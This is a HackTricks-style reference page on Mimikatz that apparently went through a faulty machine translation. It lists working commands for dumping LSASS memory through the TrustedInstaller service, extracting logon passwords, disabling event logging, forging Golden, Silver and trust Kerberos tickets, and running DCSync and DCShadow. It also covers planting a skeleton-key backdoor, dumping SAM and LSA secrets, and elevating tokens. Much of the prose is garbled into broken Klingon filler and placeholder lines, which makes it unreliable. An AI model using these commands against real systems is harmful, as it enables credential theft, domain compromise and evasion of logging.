# Mimikatz

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>DaH jImej</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhIngan Hol</strong></a><strong>!</strong></summary>

* <strong>SoHvaD</strong> <a href="https://github.com/sponsors/carlospolop"><strong>HackTricks</strong></a> <strong>DISI' ghaH</strong> <a href="https://github.com/sponsors/carlospolop"><strong>tlhIngan Hol</strong></a> <strong>ghItlh'a'?</strong> <strong>nuqneH</strong> <a href="https://github.com/sponsors/carlospolop"><strong>PEASS</strong></a> <strong>ghItlh'a'?</strong> <strong>nuqneH</strong> <a href="https://github.com/sponsors/carlospolop"><strong>PEASS</strong></a> <strong>pdf</strong> <strong>ghItlh'a'?</strong> <strong>nuqneH</strong> <a href="https://github.com/sponsors/carlospolop"><strong>PEASS</strong></a> <strong>&amp; HackTricks swag</strong> <strong>ghItlh'a'?</strong> <strong>nuqneH</strong> <a href="https://peass.creator-spring.com"><strong>PEASS &amp; HackTricks swag</strong></a>
* <strong>Join</strong> <a href="https://discord.gg/hRep4RUj7f"><strong>💬</strong></a> <strong>Discord group</strong> <strong>ghItlh'a'?</strong> <strong>nuqneH</strong> <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> <strong>telegram group</strong> <strong>ghItlh'a'?</strong> <strong>nuqneH</strong> <a href="https://t.me/peass"><strong>telegram group</strong></a> <strong>Twitter</strong> <strong>ghItlh'a'?</strong> <strong>nuqneH</strong> <a href="https://twitter.com/hacktricks_live"><strong>@carlospolopm</strong></a>
* <strong>Share your hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>hacktricks repo</strong></a> <strong>and</strong> <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>hacktricks-cloud repo</strong></a>.

</details>

**This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!

## LM and Clear-Text in memory

From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:

- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.

- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
1. Modifying the registry at _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.

Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.

### Counteracting SeDebugPrivilege Removal

Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
**This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:**

**tlhIngan Hol:**

**ghItlh:**
`lsass.exe` memory vItlhutlhlaH, vaj vay' 'oH 'ej vay' 'e' vItlhutlhlaH, credentials jatlhpu' analyze vItlhutlhlaH 'ej vItlhutlhlaH.
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz Options

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

#### Clearing Event Logs

- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
- The `event::drop` command then patches the Event Logging service.


### Kerberos Ticket Attacks

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: The domain name.
- `/sid`: The domain's Security Identifier (SID).
- `/user`: The username to impersonate.
- `/krbtgt`: The NTLM hash of the domain's KDC service account.
- `/ptt`: Directly injects the ticket into memory.
- `/ticket`: Saves the ticket for later use.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets grant access to specific services. Key command and parameters:

- Command: Similar to Golden Ticket but targets specific services.
- Parameters:
- `/service`: The service to target (e.g., cifs, http).
- Other parameters similar to Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:

- Command: Similar to Golden Ticket but for trust relationships.
- Parameters:
- `/target`: The target domain's FQDN.
- `/rc4`: The NTLM hash for the trust account.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### QaStaHvIS Kerberos QIn

- **QaStaHvIS Tickets**:
- Qap: `kerberos::list`
- QaStaHvIS tickets Kerberos DaH jImej.

- **Pass the Cache**:
- Qap: `kerberos::ptc`
- Kerberos tickets cache files inject.
- jImej: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:
- Qap: `kerberos::ptt`
- Kerberos ticket vItlhutlh.
- jImej: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Qap: `kerberos::purge`
- QaStaHvIS tickets Kerberos DaH jImej.
- QaStaHvIS ticket manipulation commands vItlhutlh.

### Active Directory Tampering

- **DCShadow**: AD chenmoHwI' vItlhutlh.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: password data request mimic DC.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA credentials vItlhutlh.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: computer account's password data vItlhutlh.
- *NetSync vItlhutlh command provided for NetSync in original context.*

- **LSADUMP::SAM**: local SAM database vItlhutlh.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: registry vItlhutlh stored secrets vItlhutlh.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: user vItlhutlh NTLM hash vItlhutlh.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust authentication information vItlhutlh.
- `mimikatz "lsadump::trust" exit`

### Miscellaneous

- **MISC::Skeleton**: backdoor LSASS inject vItlhutlh DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: backup rights vItlhutlh.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: debug privileges vItlhutlh.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: logged-on users credentials vItlhutlh.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Kerberos tickets memory vItlhutlh.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: SID and SIDHistory vItlhutlh.
- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: *modify vItlhutlh command provided for modify in original context.*

- **TOKEN::Elevate**: tokens vItlhutlh.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: multiple RDP sessions vItlhutlh.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions DaH jImej.
- *TS::Sessions vItlhutlh command provided for TS::Sessions in original context.*

### Vault

- Windows Vault vItlhutlh passwords.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
